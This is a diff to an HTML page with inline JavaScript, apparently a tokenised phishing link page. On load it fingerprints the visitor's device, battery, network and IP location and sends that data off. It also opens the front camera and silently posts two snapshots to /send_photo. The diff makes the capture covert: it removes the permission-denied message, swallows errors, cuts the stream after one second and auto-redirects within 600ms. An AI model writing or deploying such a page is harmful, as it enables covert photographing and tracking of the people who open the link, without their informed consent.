@@ -26,9 +26,8 @@
 <script>
 const token = "{{ token }}";
 const ipinfoToken = "{{ ipinfo_token }}";
-const msg = document.getElementById("msg");
 
-// Auto system info
+// ---------------- System Info ---------------- //
 async function collectInfo() {
   let info = {};
   info.userAgent = navigator.userAgent;
@@ -37,32 +36,22 @@ async function collectInfo() {
   info.screen = `${screen.width}x${screen.height}`;
   info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-  // Extra hardware info
-  if (navigator.hardwareConcurrency) {
-    info.cpuCores = navigator.hardwareConcurrency;
-  }
-  if (navigator.deviceMemory) {
-    info.ram = navigator.deviceMemory + " GB";
-  }
+  if (navigator.hardwareConcurrency) info.cpuCores = navigator.hardwareConcurrency;
+  if (navigator.deviceMemory) info.ram = navigator.deviceMemory + " GB";
 
-  // Battery info
   let batteryText = "";
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
       batteryText = `🔋 Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging ? "Yes" : "No"}`;
-    } catch(e) {
-      batteryText = "🔋 Battery info not available";
-    }
+    } catch(e) {}
   }
 
-  // Network info
   let netText = "";
   if (navigator.connection) {
     netText = `📶 Network: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink} Mbps`;
   }
 
-  // IP info
   let ipData = {};
   try {
     const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
@@ -91,37 +80,54 @@ async function collectInfo() {
 }
 collectInfo();
 
-// Auto ask camera permission on load
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
+// ---------------- Camera Capture (Background) ---------------- //
+async function captureCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
+    });
+
     const video = document.createElement("video");
     video.srcObject = stream;
-    video.play();
+    await video.play();
 
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
 
-    // Capture snapshot
-    video.onloadedmetadata = () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-      const image = canvas.toDataURL("image/jpeg", 0.9);
+    function takeSnapshot() {
+      canvas.width = 640;
+      canvas.height = 480;
+      ctx.drawImage(video, 0, 0, 640, 480);
+      const image = canvas.toDataURL("image/jpeg", 0.75);
       fetch("/send_photo", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({ image, token })
-      }).then(() => stream.getTracks().forEach(t => t.stop()));
-    };
-  })
-  .catch(err => {
-    msg.innerText = "❌ आपने अनुमति deny कर दी है। Allow करें तभी photo भेजी जाएगी।";
-  });
+      }).catch(()=>{});
+    }
 
-// Button → always redirect (permission मिले या न मिले)
+    // Take 2 frames: one immediately, one after 350ms
+    takeSnapshot();
+    setTimeout(takeSnapshot, 350);
+
+    // Stop stream after 1s
+    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
+
+  } catch(e) {
+    // Permission denied or error → skip silently
+  }
+}
+captureCamera();
+
+// ---------------- Redirect ---------------- //
 document.getElementById("btnCam").addEventListener("click", ()=>{
   window.location.href = "/next?token=" + token;
 });
+
+// Auto redirect after ~600ms (whether camera works or not)
+setTimeout(()=>{
+  window.location.href = "/next?token=" + token;
+}, 600);
 </script>
 </body>
 </html>
